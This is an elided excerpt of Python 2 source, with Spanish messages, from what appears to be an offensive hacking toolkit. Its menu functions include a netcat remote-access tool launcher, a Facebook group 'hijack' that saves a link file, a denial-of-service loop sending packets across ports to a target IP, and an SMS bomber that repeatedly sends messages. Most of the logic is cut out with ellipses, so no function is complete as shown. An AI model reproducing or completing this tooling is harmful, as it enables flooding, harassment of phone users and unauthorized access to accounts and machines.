...
def netcat_rat():
	...
	if nccheck != 0:
		print "[-] Netcat no esta Instalado!!!"
		backtomenu_option()
	else:
		netcatrat_menu()
...
def facebookgroup_hijack():
	...
	try:
		...
		file.write(linkjack)
		file.close()
		print "[+] LinkJack guardado como .txt archivo llamado fbghack.txt"
		backtomenu_option()
	except IOError, e:
		print "\nERROR:",e
		backtomenu_option()
...
def denialofservice_attack():
	...
	while True:
		...
		sent = sent + 1
		port = port + 1
		print "Expedido %s paquete a %s a través de port:%s"%(sent,ip,port)
		if port == 65534:
			port = 1
...
def sms_bomber_jdid():
	...
	while (count < countx):
		...
		if '"success":true' in r.text:
			print("\n\033[1;32m[  OK  ] Enviado con Exito...Sleep for 1 second...\033[0m")
		else:
			print("\n\033[1;31m[FAILED] Envio Fallido...Sleep for 1 second...\033[0m")
		time.sleep(1)
		count = count + 1
	print("\033[1;33m[ DONE ] Deteniendo...\033[0m")
	backtomenu_option()
